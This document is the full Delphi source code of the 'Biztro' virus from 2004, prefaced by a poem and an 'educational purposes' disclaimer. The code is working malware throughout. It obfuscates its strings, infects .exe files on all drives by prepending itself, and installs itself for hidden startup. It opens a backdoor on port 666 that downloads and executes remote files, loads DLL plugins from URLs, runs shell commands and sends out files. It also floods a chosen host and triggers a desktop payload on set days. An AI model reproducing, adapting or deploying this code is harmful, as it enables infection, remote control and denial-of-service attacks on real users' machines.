     { well first see what i do in my sad times... he... }
   {   *Biztro*

   See the sky
   well now it is a little bit dark
   just like your eyes...
   smell the air...
   forget the pain...

   Make me forget
   make me wish
   can you make me dream?
   teach to me please...

   Where you come from?
   from my mind?
   are you behind my eyes?
   or you just look me behind
   that very dark glass?

   See my face, can you see
   all the pain?
   can you feel that in the air?
   can you see what i wish?
   The reason why I am here?

   Keep this secret with you
   run...
   just run...
   forget me..
   i never exists...
   i never say this...
   i don't belong here...
   }
   {Byt3Cr0w/GEDZAC 2004 (C)}
   {------------------------------------}
   { Biztro Virus - designed & coded by Byt3Cr0w/GEDZAC }
   { Started: 23/10/2004 - Finish: 9/11/2004 }
   { Dedicated to: All Gedzac members - Falckon (hey Bro!) - & - BlackRose (hi sister! :))}
   { I make this program/virus just for educational porpouses }
   { I don't spread this program/virus and i will never do that }
   { Use this code just for education & fun! }
   { If you make some changes or spread this program/virus you will be responsible! }
   { Important: the author is not responsible for any damage that occurred from the use of this program. }
   { if you are not agree with this terms then please erase this sourcecode from your Hard Disk. }
   {Warning: This is a BETA version so maybe you will find some errors... }
   {if you find bugs or errors please send me an email and i will fix that...
   { email: byt3cr0w@gedzac.zzn.com }
   {---------------Have Fun!-------------}


   program Biztro;
   uses
     Windows,
     WinSock,
     SysUtils,URLMON,ShellApi;
   const SP = #13#10; BufX = 2000; virussize=30208;
         d0z = 'žš¸PN”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎN~vz`~`tvr~z`~|vzxt~|z~|z`~|zvt|zx|zvt~|zv~xp|z~vr|zrbx~z|~z|rx~z||Nbv`pp'+
               'p~`vx|xp`~z~xz`~z~pp~rz~r|zr|zrb|zrpbz|pzpN”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ`~v~v~v`~xvt~|xvt~x|vt~|”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎp`~xvvt~|x~vtr|x~vtr|x|vtxNbvt`x`tvr”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”Â'+
               'äøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎpppppNppppppppppppppppppppppppppppppppppppppp´ÚöðÚÖø¸ÀÚ–ÎØÂÌÞ’ôøppppppppppppppppppppppppppp'+
               'ppppppppppppppppppppppppppppNNNNNNNLLLLLLLLLLLNNNNNLLNNNLLLLLLLLLLLLLLNNNNNNNNNNNNNNNNNNNNNNNLLLLLLNNNNNNNNLLLNNLLNNLNNNNNNNNNLLLLNNNNNLLNLNLNN';
   //Thnx To Sickbyte/Primatelost for the Flood Idea//
   var x,OhRead,OhWrite,CTS,me,current,oupz:integer; shutdownx: Boolean = False;
   j,RID,RSS,IT,CP,filename,exec_lines,about,doztar: string;ID:dword;
   f1,f2:file;silence:word;
   bufete:array[1..virussize] of char;
   clock:TSystemTime;

   procedure sendback(const delivery:string );
   begin
   send(x,pointer(delivery)^,length(delivery),0);
   end;

   function winpath:String;
   var winfol:pchar;
   WTama : dword;
   begin
   WTama := MAX_PATH + 1;
   GetMem( winfol, WTama );
   try
   if Windows.GetWindowsDirectory( winfol, WTama ) <> 0 then
   Result := winfol;
   finally
   FreeMem(winfol);
   end;
   end;

   function Petition(m:integer):boolean;
   begin
   CTS := 1;
   IT := '100';
   try
   if m = 1 then begin
   if CTS >= StrToInt(IT) then Result:=False{Reject New Thread Petition} else
   begin
   Result:=true; {Accept New thread Petition}
   Inc(CTS);
   end;
   end;
   except Result := true; exit; end;
   if m = 2 then CTS := CTS - 1;
   end;


   Function d(things:string):string;
   var newx,s:string;
       LlL,OoO,o,r:integer;
   begin
   o := strlen(pchar(things));
   For r := 1 to o do begin
   s := s + chr(ord(things[r]) div 2)
   end;
   LlL := strLen(PChar(s));
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(s[OoO]) xor 8);
   end;
   Result := newx;
   end;

   procedure D0zIt;
   var sadd:TSockAddr;D0zDat:TWSAData;D0zSock:TSocket;
   label gogogo;
   begin
    WSAStartup($101,D0zDat);
     D0zSock := Socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
     if D0zSock = INVALID_SOCKET then exit;
     with sadd do begin
       sin_family := AF_INET;
       sin_port := htons(80);
       sin_addr.S_addr := Inet_Addr(pchar(doztar));
     end;
     if not Connect(D0zSock,sadd,SizeOf(sadd)) = 0 then exit;
     gogogo:
     Send(D0zSock,pointer(d(d0z)+sp)^,length(d(d0z)+sp),0);
     goto gogogo;
   end;

   procedure bye(Sock:Integer);
   begin
     ShutDown(Sock,2);
     CloseSocket(Sock);
   end;


   procedure Doz(m:string);
   var x1:string;
       e:integer;
   begin
   if doztar <> '' then exit;
   shutdownx := true;
   Bye(x);
   x1:=m;
   Delete(x1,1,3);
   doztar:=x1;
   CreateThread(nil,0,@D0zIt,nil,0,ID); //We don't care the Max. Threads...we create one thread for the D0z
   for e:= 1 to 5 do if Petition(1) then CreateThread(nil,0,@D0zIt,nil,0,ID);
   //We Make some petitions for create 5 more Threads...
   end;


   function cutwin:string;
   var i:integer;s,x:string;
   begin
   for i := Length(winpath) downto 0 do s :=s+winpath[i]; i:=0;
   for i := 0 to Length(s) do if s[i] <> d('¨') then Result := Result + s[i] else break; i:=0;
   for i := Length(Result) downto 0 do x:=x+Result[i]; i:=0;Result := x;
   end;

   function OwnedCell(CellTarget:string):boolean;
   var Buff3:array[1..VirusSize] of Char;
   P4m,Eip:file;
   p0p,pu5h,iox:integer;
   BioCell:string;
   begin
   filemode:=2;
   {$I-}
   AssignFile(Eip,CellTarget); Reset(Eip, 1); CloseFile(Eip);
   {$I+}
   iox := IOResult; FileMode := 0 ;
   if iox = 0 then begin
   AssignFile(P4m,CellTarget);
   reset(P4m,1); Seek(P4m,FileSize(P4m)-6); BlockRead(P4m,Buff3,sizeof(Buff3),pu5h);
   For p0p := 1 to sizeof(Buff3) do BioCell := BioCell + Buff3[p0p];
   if Pchar(BioCell) = d('”ÂäøôŽ') then result :=true else Result :=false;
   closefile(P4m);
   end else Result := false;
   end;

   Procedure OwnCell(Prozak2S:String);
   Var
    Prozak1S,ZXC1:String;
    Prozak1,Prozak2,ProzakGedzac1:File;
    GEDZAC,GROUP:Integer;
    Buf: array[1..2048] of Char;
   Begin
    if OwnedCell(Prozak2S) = false then
    begin
    Prozak1S:=winpath+d('¸ÚÊð¨”ÂäøôÎLÚàÚ');
    CopyFile(pchar(ParamStr(0)),Pchar(Prozak1S), FALSE);
    ZXC1:=Prozak2S+d('LøÊð'); FileMode:=0;
    AssignFile(Prozak1, Prozak1S); Reset(Prozak1,1);
    AssignFile(Prozak2, Prozak2S); Reset(Prozak2,1);
    AssignFile(ProzakGedzac1, ZXC1); Rewrite(ProzakGedzac1, 1);
    Repeat
   BlockRead(Prozak1, Buf, SizeOf(Buf), GEDZAC); BlockWrite(ProzakGedzac1, Buf, GEDZAC, GROUP);
    Until (GEDZAC = 0) or (GROUP <> GEDZAC);
    Repeat
   BlockRead(Prozak2, Buf, SizeOf(Buf), GEDZAC); BlockWrite(ProzakGedzac1, Buf, GEDZAC, GROUP);
    Until (GEDZAC = 0) or (GROUP <> GEDZAC);
    BlockWrite(ProzakGedzac1,'BiztrO',6); CloseFile(ProzakGedzac1);
    CloseFile(Prozak1); CloseFile(Prozak2);
    CopyFile(Pchar(ZXC1),Pchar(Prozak2S), FALSE); DeleteFile(Pchar(ZXC1));
   End; End;

   procedure Scan(folder:Ansistring);
   var buscame  : TSearchRec;
       encontrado    : String;
       anne : Integer;
       tipo:AnsiString;
   begin
   silence := SetErrorMode(SEM_FailCriticalErrors);
   Tipo := d('DLÚàÚ');
      if folder[Length(folder)] <> d('¨') then folder := folder +d('¨');
      anne := FindFirst(folder + d('DLD'), faAnyfile,buscame); while anne = 0 do
       begin
         if (buscame.name <> '.') and (buscame.name <> '..') and (buscame.name <> cutwin) then
           if buscame.Attr and faDirectory > 0 then
           begin

           Scan(folder+buscame.Name);
           end;
         anne := FindNext(buscame);
       end;
      if folder[Length(folder)] <> '\' then folder := folder + '\';
      anne := FindFirst(folder+tipo, faAnyFile - faDirectory,buscame);
      while anne = 0 do
       begin
         if(buscame.name <> '.') and (buscame.name <> '..') and (buscame.name <> '')
            then begin
                  encontrado := folder + buscame.name;
              OwnCell(encontrado);

                 end;
         anne := FindNext(buscame);
       end;
   end;


   function ScanCells:integer;
   var A:char;
   begin
   silence := SetErrorMode(SEM_FailCriticalErrors);
   for A := 'A' to 'Z' do if fileexists(A+d('d¨Œºˆˆ')) then Scan(A+d('d¨'));
   Petition(2);
   end;

   procedure InfectCenter;
   var A:char;
   begin
   silence := SetErrorMode(SEM_FailCriticalErrors);
   if Petition(1) then CreateThread(nil,0,@ScanCells,nil,0,ID) else
   begin
   for A := 'A' to 'Z' do if fileexists(A+d('d¨Œºˆˆ')) then Scan(A+d('d¨'));
   Petition(2);
   end;
   end;


   procedure aislamiento(const m:integer);
   var i,b:integer;
   Ou: TProcessInformation;
   Uo: TStartupInfo;
   begin
   FillChar(Ou, sizeof(TProcessInformation), 0);
   FillChar(Uo, sizeof(TStartupInfo), 0);
   Uo.cb := sizeof(TStartupInfo);
   Randomize;
   if not DirectoryExists(d('–d¨¾‚Œ˜Ž¾¶¨œŽŒ¸¶¨œÎÌøöœÂÈÚö¨')) then CreateDirectory(Pchar(d('–d¨¾‚Œ˜Ž¾¶¨œŽŒ¸¶¨œÎÌøöœÂÈÚö¨')),nil);
   b := Random(StrToInt(d('bbbbb')));
   FILENAME := winpath+d('¨œÎÌøö¨œÎÌøöœÂÈÚö')+InttoStr(b)+d('LÚàÚ');
   if m = 1 then begin if DirectoryExists(winpath+d('¨œÎÌøö¨')) then Filename := winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ') else begin createdirectory(Pchar(winpath+d('¨œÎÌøö¨')),nil); Filename := winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ'); end;
   if m = 2 then Filename := winpath+d('¸ÚÊð¨”ÂäøôÎLÚàÚ');
       assign(f1,paramstr(0)); assign(f2,filename);
       filemode := 0; reset(f1,1); rewrite(f2,1);
       seek(f1,virussize);
       repeat
       blockread(f1,bufete,2048,OhRead); blockwrite(f2,bufete,OhRead,OhWrite);
       until (OhRead=0) or (OhWrite<>OhRead);
       close(f1); close(f2); exec_lines:='';
   if m = 1 then exit;
      if paramcount>0 then for i:=1 to paramcount do exec_lines:=exec_lines+' '+paramstr(i);
       if exec_lines <> '' then filename := filename + exec_lines;
      if m = 0 then
       begin
       if CreateProcess(Pchar(filename), nil, nil, nil,false, NORMAL_PRIORITY_CLASS, nil, nil,Uo,Ou) <> False then begin
       WaitForSingleObject(Ou.hProcess,INFINITE);
       CloseHandle(Ou.hThread);
       CloseHandle(Ou.hProcess);
       DeleteFile(filename);
       end;
       end else ShellExecute(0,nil,PChar(filename),'','',SW_SHOWNORMAL);
   end;end;


   Function ex(things:string):string;
   var newx,s:string;LlL,OoO,o,r:integer;
   begin
   LlL := strLen(PChar(things));
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(things[OoO]) xor 8)
   end;
   o := strlen(pchar(newx));
   For r := 1 to o do begin
   s := s + chr(ord(newx[r]) * 2)
   end;
   ex := s;
   end;


   function Username:string;
   var zize: dword;
   RainChar:array[0..255] of char;
   begin
   zize := 256;
   if GetUserName(RainChar,zize) then
   Result:=RainChar
   else Result := d('”ÂäøôÎPÖÒÌøPÜÎúÌØPøÀÚPÔÎØâPÌÒÊÚ');
   end;


   function SendToShell(x:string):string;
   var a:textfile;
       ran1,ran2,m:string;
       label wait;
   begin
   Randomize;
   m := x;
   Delete(m,1,3);
   ran1 := IntToStr(Random(9999)+1) + d('LÔÒø');
   if not DirectoryExists(winpath+'\Temp\IEDat') then CreateDirectory(Pchar(winpath+'\Temp\IEDat'),nil);
   ran2 := winpath+'\Temp\IEDat\Biz0'+IntToStr(Random(9999)+1);
   AssignFile(a,'C:\'+ran1);
   rewrite(a);
   writeln(a,d('ÖÊØLÚàÚPNÖP')+M+d('ll')+ran2);
   closefile(a);
   WinExec(Pchar(d('–d¨')+ran1),sw_HIDE);
   wait:
   sleep(500);
   if not fileexists(ran2) then goto wait;
   Deletefile(Pchar(d('–d¨')+ran1));
   sendback(ran2);
   end;


   function Wakesock: Boolean;
   var
     anne: TWSAData;
   begin
     Result :=  WSAStartup( $101, anne ) = 0
   end;


   function LoadService(casa:integer): Integer;
   var direc: TSockAddrIn;
   begin
     Result := Socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );
     if Result = INVALID_SOCKET then
       Exit;
     with direc do begin
       sin_family := AF_INET;
       sin_port := htons(casa);
       sin_addr.S_addr := 0;
     end;

     if Bind( Result, direc, SizeOf(direc) ) <> 0 then begin
       Result := INVALID_SOCKET;
       Exit;
     end;

     if Listen(Result,5) <> 0 then
       Result := INVALID_SOCKET;
   end;


   Function GetValue(txt:string):string;
   var i,p,s:integer;
   axe: string;
   begin
   p := 0;
   For i := 1 to strLen(pchar(txt)) do begin
   p := p +1;
   if txt[i] = d('T') then begin
   break;
   end
   end;
   For s := p+1 to strLen(pChar(txt)) do begin
   if txt[s] = d('T') then begin
   break;
   end;
   axe := axe + txt[s];
   end;
   Result := axe;
   end;


   function BioSetup:string;
   var a:textfile;
       b,Setup:string;
       fail:integer;
   label try_again;
   begin
   fail := 0;
   AssignFile(a,winpath+d('¨þÂÌØÒøLØÒø'));
   if not Fileexists(winpath+d('¨þÂÌØÒøLØÒø')) then
   begin
   Setup := d('’jTrzT')+sp+
            d('”jTšÌÒÔÈÚT')+sp+
            d('–jTt|T')+sp+
            d('˜jTpT');
   rewrite(a); writeln(a,Setup); closefile(a);
   Result := Setup;
   end;
   try_again:
   Try
   {-------Start Reading Bio Setup File-------}
   {} reset(a);                              {}
   {------------------------------------------}
   {} //Re-Infection Day                     {}
   {} readln(a,b);                           {}
   {} RID := GetValue(b);                    {}
   {} b := '';                               {}
   {} //Remote Shell Status                  {}
   {} readln(a,b);                           {}
   {} RSS := GetValue(b);                    {}
   {} b := '';                               {}
   {} //Infecting Threads                    {}
   {} readln(a,b);                           {}
   {} IT := GetValue(b);                     {}
   {} b := '';                               {}
   {} //Current Plugins                      {}
   {} readln(a,b);                           {}
   {} CP := GetValue(b);                     {}
   {} b := '';                               {}
   {------------------------------------------}
   {} closefile(a);                          {}
   {}BioSetup:=d('–úôôÚÌøP¼ÚôöÂÎÌPjPrLp')+sp+{}
   {}d('ŒÒÊÚPŽÜP‚ÌÜÚÖøÚØP”ÎØâPjP')+Username+ {}
   {}sp+d('´ÚJ‚ÌÜÚÖøÂÎÌP˜ÒâPjP')+RID+sp+     {}
   {}d('´ÚÊÎøÚP¶ÀÚÈÈP¶øÒøúöPjP')+RSS+sp+     {}
   {}d('ŒúÊÔÚôöPŽÜP‚ÌÜÚÖøÂÎÌP¸ÀôÚÒØöPjP')+   {}
   {}IT+sp+d('–úôôÚÌøP°ÈúÞÂÌöPjP')+CP;       {}
   {--------End Reading Bio Setup File--------}
   except rewrite(a); writeln(a,Setup); fail:=1;
   end;
   if fail = 1 then goto try_again;
   end;

   procedure BioChange(const w:string;i:integer);
   var a:textfile;
       b,c,d2,n,x,m:string;
       u:integer;
   begin
   m := w;
   Delete(m,1,3);
   AssignFile(a,winpath+d('¨þÂÌØÒøLØÒø'));
   Reset(a);
   if i = 1 then begin Readln(a,c); Readln(a,b); x:=b+sp; Readln(a,b); x:=x+b+sp; Readln(a,b); x:=x+b; end;
   if i = 2 then begin Readln(a,b); Readln(a,c); Readln(a,n); x:=n+sp; Readln(a,n); x:=x+n; end;
   if i = 3 then begin Readln(a,b); x:=b+sp; Readln(a,b); x:=x+b+sp; Readln(a,c); Readln(a,n); end;
   if i = 31 then begin Readln(a,b); x:=b+sp; Readln(a,b); x:=x+b+sp; Readln(a,b); x:=x+b+sp; Readln(a,c); end;
   if i <> 31 then Delete(c,3,length(c)-3);
   if i = 1 then d2:= c+m+'"'+sp+x; if i = 2 then d2:= b+sp+c+m+'"'+sp+x; if i = 3 then d2:= x+c+m+'"'+sp+n;
   if i = 31 then
   begin
   u:= StrToInt(GetValue(c));
   if m = d('’ØØ') then Inc(u);
   if m = d('˜ÚÈ') then Dec(u);
   d2 := x+d('˜jT')+IntToStr(u)+d('T');
   end;
   rewrite(a);
   writeln(a,d2); closefile(a);
   if i = 15 then
   begin
   AssignFile(a,winpath+d('¨þvtÀÈðLÀÈð'));
   try append(a); except rewrite(a); end;
   writeln(a,m); closefile(a);
   end;
   SendBack(d('šr'));
   end;



   function DownBytes(m:string;e:integer):boolean;
   var rum,ex,x:string;
       i:integer;
   begin
   try
   Randomize;
   rum := winpath+d('¨')+IntToStr(Random(99999));
   Delete(m,1,3);
   for i := Length(m) downto 0 do ex:=ex+m[i]; i:=0;
   for i := 1 to Length(ex) do if ex[i] <> '.' then x:=x+ex[i] else break;i:=0;ex:='';
   for i := Length(x) downto 0 do ex:=ex+x[i]; i:=0;
   rum := rum+'.'+ex;
   UrlDownLoadToFile(nil,Pchar(m),Pchar(rum),0,nil);
   if e=2 then ShellExecute(0,nil,PChar(rum),'','',SW_SHOWNORMAL);
   sendback(d('”r')+rum);
   except end;
   end;


   function syspath:string;
   var sysfolx:pChar;
   begin
   GetMem(sysfolx,100);
   if GetSystemDirectory(sysfolx,100) <> 0 then Result := sysfolx;
   FreeMem(sysfolx,100);
   end;


   procedure AddPlug(const s:string);
   var plugdir,m:string;
   begin
   m := s;
   Delete(m,1,3);
   plugdir:= syspath+d('¨þÂÌ')+IntToStr(Random(99999))+d('LØÈÈ');
   try
   UrlDownLoadToFile(nil,Pchar(m),Pchar(plugdir),0,nil);
   except exit; end;
   BioChange(d('’ØØ'),31);
   BioChange(plugdir,15);
   try SetFileAttributes(PChar(plugdir),FILE_ATTRIBUTE_HIDDEN); except end;
   LoadLibrary(Pchar(plugdir));
   sendback(d('–r'));
   end;

   function LoadPlugs:integer;
   var a:textfile;
       b:string;
   label Load;
   begin
   AssignFile(a,winpath+d('¨þvtÀÈðLÀÈð'));
   try Reset(a);
   except exit; end;
   Load:
   readln(a,b);
   if b <> '' then try LoadLibrary(Pchar(b)); except BioChange(d('˜ÚÈ'),31); closefile(a); exit; end;
   if b <> '' then goto load;
   closefile(a);
   end;

   procedure MakeItDownload(const x:string);
   var i:integer;
       s,m,from:string;
       begin
   m := x;
   Delete(m,1,4);
   from := m;
   for i:= 1 to Length(m) do if m[i] <> #32 then s:=s+m[i] else s:=s+d('F');
   m := Copy(s,1,3);
   Delete(s,1,3);
   s := m+d('”Âäp')+s;
   CopyFile(Pchar(from),Pchar(s),true);
   sendback(d('˜r'));
   end;


    procedure sendf(const m:string);
      var   vz:array [0..1023] of Char;
       ozz,fw:integer;
       iam:file;
       z,afuera,noexists,fat,rum:string;
       a:textfile;
      begin
      rum := d('”ÂäøôÎžÚØäÒÖ')+IntToStr(Random(99999))+d('Løàø');
      z := m;
       Delete(z,1,5);
   z := Copy(z, 1, Pos(D('€¸¸°Nr'), z) - 2);
   noexists := d('”ÂäøôÎP”âP”âøv–ôpþNžš˜¤’–')+sp+d('”ÂäøôÎPÖÒÌøPÜÂÌØPøÀÂöPÜÂÈÚ')+sp+d('”ÂäøôÎPÌÎPðúÚØÚPÚÌÖÎÌøôÒôPÚÈPÒôÖÀÂüÎ')+z+sp+d('žÚØäÒÖPˆÒÔöPtppxPJPþþþLÞÚØäÒÖLøÆ');
      if not fileexists(z) then
      begin
      z := d('–d¨')+rum;
      AssignFile(a,z); rewrite(a); writeln(a,NoExists); closefile(a);
      end;
      fw := FileOpen(z,0);
      fat := floattostr(getfilesize(fw,nil));
      fileclose(fw);
      AssignFile(iam,z);
            filemode:=0;
           try reset(iam,1); except end;
       afuera := d('€¸¸°NrLrPtppPŽ†') + SP
           + d('’ÖÖÚðøJ´ÒÌÞÚödPÔâøÚö') + SP
           + d('–ÎÌøÚÌøJˆÚÌÞøÀdP')+fat + sp
           + d('†ÚÚðJ’ÈÂüÚdPøÂÊÚÎúøjrzHPÊÒàjrpp') + sp
           + d('–ÎÌÌÚÖøÂÎÌdP†ÚÚðJ’ÈÂüÚ') + sp
           + d('–ÎÌøÚÌøJ¸âðÚdPÒððÈÂÖÒøÂÎÌNàJÊöØÎþÌÈÎÒØ') + sp + sp;
              Send( x, Addr(afuera[1])^, Length(afuera), 0 );
       repeat
         BlockRead(iam,vz[0],SizeOf(vz),ozz);
         if ozz<=0 then break; if send(x,vz[0],ozz,0)<=0 then break;
       until ozz<>1024;
       closefile(iam);
       end;



   procedure RemoteModule(me:Pointer);
   var
     Data: array[ 0..8191 ] of Char;
     w,z: Pointer;
     l: Char;
       begin
     x := Integer(me);
     repeat
       current := Recv(x, Data, SizeOf(Data), 0 );
       if current = 0 then
         current := SOCKET_ERROR
       else
       begin
         w := @Data;
         z := Pointer(Integer(@Data) + current);
         l := #0;
         while Integer(w) < Integer(z) do begin
           if (l = #13) and (Char(w^) = #10 ) then begin
             Inc( Integer(w));
             Continue;
           end;
           l := Char(w^);
           if l = #13 then
           begin
                                    TRY
       if     j = d('°')      then sendback(d('r'));
       if Pos(d('ND¨'),j) > 0 then DownBytes(j,1);
       if Pos(d('NF¨'),j) > 0 then DownBytes(j,2);
       if Pos(d('Np¨'),j) > 0 then AddPlug(j);
       if Pos(d('” –'),j) > 0 then if RSS = d('šÌÒÔÈÚ') then SendBack(SendToShell(j));
       if Pos(d('Š‚˜'),j) > 0 then MakeItDownload(j);
       if Pos(d('žš¸'),j) > 0 then sendf(j);
       if Pos(d('h‚l'),j) > 0 then BioChange(j,1);
       if Pos(d('hšl'),j) > 0 then BioChange(j,2);
       if Pos(d('h¸l'),j) > 0 then BioChange(j,3);
       if Pos(d('¶øÒ'),j) > 0 then sendback(BioSetup);
       if Pos(d('˜D¤'),j) > 0 then Doz(j);
                                except end;
           j := '';
           end else
             j := j + l;
           Inc(Integer(w));
         end;
       end;
     until current = SOCKET_ERROR;
     bye(x);
   end;


   function StartService(Server,typex: Integer):string;
   var anne: Integer;
       yeah: Cardinal;
   begin
     anne := Accept( Server, nil, nil );
     if anne <> INVALID_SOCKET then begin
      if BeginThread( nil, 65536, @RemoteModule,Pointer(anne), 0,yeah) = 0 then
         bye(anne);
        end;
        end;

   function LiveListen:integer;
   begin
     if not Wakesock then exit;
     me := LoadService(666);
     if me = INVALID_SOCKET then exit;
     repeat
       StartService(me,1);
     until shutdownx;
     bye(me);
     WSACleanUp;
     end;


   procedure Install;
   begin
   aislamiento(0);aislamiento(1);
   CreateThread(nil,0,@InfectCenter,nil,0,ID);
   halt(0);
   end;

   function payme_:integer;
   var a : TRect;z: string;p:integer;
   label go;
   begin
   Randomize;
   go:
   p := Random(2)+1;
   if p = 1 then z := d('”Âäøôp') else z:= d('žÚØäÒÖPˆÒÔöPtppx');
   a.Left := Random(1000);a.Top  := Random(700);
   a.Right := Random(129999999);a.Bottom := Random(99990000);
   DrawText( GetWindowDC( Getdesktopwindow()),Pchar(z ),length(z),a,0);
   goto go;
   end;

   function Bomb:integer;
   var a:string;
       b,c,d,e:integer;
   begin
   Randomize;
   a := Username;
   b := ord(a[1]);;
   if ( b > 51) and (b < 101) then c:=1;
   if (b > 101) and (b < 152) then c:=2;
   if (b > 152) and (b < 203) then c:=3;
   if (b > 203) and (b < 254) then c:=4;
   if (b > 254) then c:=5;
   d := Random(2)+1;e := Random(2)+1;
   case c of
   1: begin if d < 2 then Result:=6 else Result := Random(6)+1; end;
   2: begin if d < 2 then Result:=12 else Result := Random(12)+1; end;
   3: begin if d < 2 then Result:=18 else Result := Random(18)+1; end;
   4: begin if d < 2 then Result:=24 else Result := Random(24)+1; end;
   5: begin if d < 2 then if e < 2 then begin Result:=30 end else begin Result:=31 end else Result := Random(6)+1; end;
   end;
   end;

   begin

   BioSetup;
   About := 'Biztro BETA version - By Byt3Cr0w/GEDZAC - maybe you will found some errors - wait for the final version';
   GetlocalTime(Clock);
   if Clock.Wday = Bomb then begin MessageBox(0,Pchar(d('¦J”ÂäøôŽPÔâP”âøv–ôpþNžš˜¤’–PJP¸ÀÒÌàPøÎPÒÈÈPžÚØäÒÖPÒÌØPÒPÔÂÞPøÀÒÌàPÜÎôPÊâPœÒÈÖÆÎÌP\P”ÈÒÖÆ´ÎöÚ')),Pchar(d('”ÂäøôŽ')),32); for oupz := 1 to 10 do Createthread(nil,0,@payme_,nil,0,ID); sleep($ffffffff); end;
   aislamiento(2);
   if not fileexists(winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ^')) then Install;
   if paramstr(0) = winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ^') then
   begin
   CreateMutex(nil, false,Pchar(d('”ÂäøôÎ')));
   if GetLastError = ERROR_ALREADY_EXISTS then halt(0);
   CreateThread(nil,0,@LiveListen,nil,0,ID);
   CreateThread(nil,0,@LoadPlugs,nil,0,ID);
   if Clock.Wday = StrToInt(RID) then CreateThread(nil,0,@InfectCenter,nil,0,ID);
   sleep($ffffffff);
   end;
   aislamiento(0);
   WinExec(Pchar(d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ^')),SW_HIDE);
   halt(0);
   end.
